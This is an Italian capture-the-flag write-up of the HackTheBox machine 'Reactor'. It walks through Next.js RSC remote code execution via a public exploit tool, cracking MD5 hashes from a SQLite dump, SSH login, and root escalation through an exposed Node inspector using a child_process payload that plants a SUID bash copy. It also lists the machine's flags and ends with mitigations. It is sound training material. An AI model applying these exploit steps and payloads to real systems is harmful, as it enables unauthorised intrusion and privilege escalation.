# HackTheBox Writeup – Reactor

**IP Target:** `10.129.40.40`
**Difficoltà:** Facile/Media
**OS:** Linux

---

## 1. Ricognizione (Enumeration)

Scansione iniziale delle porte con `nmap`:

```bash
nmap -sC -sV 10.129.40.40
```

**Risultati:**

| Porta | Servizio | Versione |
|-------|----------|----------|
| 22    | SSH      | OpenSSH 9.6p1 (Ubuntu) |
| 3000  | HTTP     | Next.js (Node.js) |

L'header `X-Powered-By: Next.js` e le stringhe RSC (`Vary: RSC, Next-Router-State-Tree...`) confermano che il target espone un'applicazione **Next.js**.

Verifica manuale della risposta HTTP:

```bash
curl -sI http://10.129.40.40:3000/
whatweb http://10.129.40.40:3000/
```

Il sito si presenta come **"ReactorWatch | Core Monitoring System"** — una dashboard di monitoraggio per un reattore nucleare fittizio.

---

## 2. Accesso Iniziale (Initial Access)

### 2.1 Fingerprinting della versione

Aperta la Developer Console del browser (F12) sulla pagina, è stata identificata la versione esatta di Next.js in uso tramite l'oggetto globale del framework.

### 2.2 Ricerca della vulnerabilità

La versione individuata risulta affetta da **CVE-2025-66478**, una vulnerabilità RCE nelle Next.js Server Actions / React Server Components (RSC), sfruttabile tramite manipolazione del parsing del body multipart/form-data e dell'header `Next-Action`.

### 2.3 Exploitation

Utilizzato l'exploit pubblico **react2shell-ultimate** (CVE-2025-66478 Scanner):

```bash
git clone https://github.com/hackersatyamrastogi/react2shell-ultimate.git
cd react2shell-ultimate
python3 -m venv venv3
source venv3/bin/activate
pip3 install -r requirements.txt
```

Verifica della vulnerabilità (side-channel, nessuna esecuzione di codice):

```bash
python3 react2shell-ultimate.py -u http://10.129.40.40:3000 --safe
```

Ottenuta una shell interattiva in **god mode**:

```bash
python3 react2shell-ultimate.py --god -u http://10.129.40.40:3000 --shell
```

Risultato:

```
[✓] Target is exploitable! User: uid=999(node) gid=988(node) groups=988(node)
```

Da qui è stato possibile eseguire comandi come utente `node`:

```
whoami   -> node
id       -> uid=999(node) gid=988(node) groups=988(node)
pwd      -> /opt/reactor-app
ls       -> app  next.config.js  node_modules  package.json  package-lock.json  reactor.db
```

---

## 3. Movimento Laterale e User Flag

### 3.1 Individuazione del database

Nella cartella dell'app è presente un file **`reactor.db`** (SQLite):

```bash
cat reactor.db
strings reactor.db
```

Dallo string-dump emerge la tabella `users` con credenziali salvate come hash MD5. Estrazione pulita del contenuto con:

```bash
sqlite3 reactor.db .dump
```

Output rilevante:

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
);
INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');
INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb');
```

### 3.2 Cracking dell'hash

L'hash a 32 caratteri associato all'utente `engineer` è stato identificato come **MD5** e sottoposto a cracking (es. via CrackStation), ottenendo la password in chiaro.

### 3.3 Accesso SSH

```bash
ssh engineer@10.129.40.40
```

Login riuscito e lettura della flag utente:

```bash
ls
cat user.txt
```

```
58bfdc75155c6eafd9c6a23acecbc894
```

---

## 4. Privilege Escalation e Root Flag

### 4.1 Tentativi iniziali

Tentativo (fallito, nessun accesso a Internet dalla macchina) di scaricare ed eseguire `linpeas.sh`:

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
```

### 4.2 Enumerazione manuale dei processi

```bash
ps aux | grep node
```

```
node   1410  ...  next-server (v15.0.3)
root   1412  ...  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Un processo Node eseguito **da root** ha il **Node.js Inspector** attivo in ascolto su `127.0.0.1:9229` — un vettore noto di RCE, poiché l'inspector protocol consente l'esecuzione di codice arbitrario nel contesto del processo.

### 4.3 Collegamento all'Inspector

```bash
node inspect 127.0.0.1:9229
```

All'interno della sessione di debug è stato verificato l'UID del processo:

```
debug> exec("process.getuid()")
0
```

### 4.4 Payload di Privilege Escalation

Sfruttato il modulo `child_process` per copiare la shell `bash` con bit SUID:

```javascript
exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")
```

Questo copia `/bin/bash` in `/tmp/r00t` e imposta il bit **SUID**, rendendo il binario eseguibile con i permessi del proprietario (root) da qualsiasi utente.

### 4.5 Ottenimento di Root

```bash
/tmp/r00t -p
```

```
r00t-5.2# whoami
root
```

Lettura della flag finale:

```bash
cd /root
cat root.txt
```

```
3ce6efac5565e8ac838d6021890dee37
```

---

## 5. Riepilogo del percorso di attacco

1. **Recon** → Nmap rivela SSH (22) e un'app Next.js (3000).
2. **Initial Access** → CVE-2025-66478 (Next.js RSC RCE) sfruttata con `react2shell-ultimate` → shell come `node`.
3. **Credenziali** → Estrazione di `reactor.db` (SQLite), hash MD5 dell'utente `engineer` crackato.
4. **User Flag** → Login SSH come `engineer`.
5. **Privesc** → Processo Node root con Inspector esposto su `127.0.0.1:9229` → RCE via `child_process` → binario `bash` con SUID.
6. **Root Flag** → Shell privilegiata con `/tmp/r00t -p`.

---

## 6. Lezioni apprese / Mitigazioni

- Mantenere Next.js aggiornato per evitare CVE note su Server Actions/RSC.
- Non salvare password in chiaro o con hash deboli (MD5) nel database applicativo.
- Non esporre mai il Node.js Inspector (`--inspect`), nemmeno su `127.0.0.1`, su processi eseguiti con privilegi elevati (root) in produzione.
- Applicare il principio del minimo privilegio ai processi di servizio.
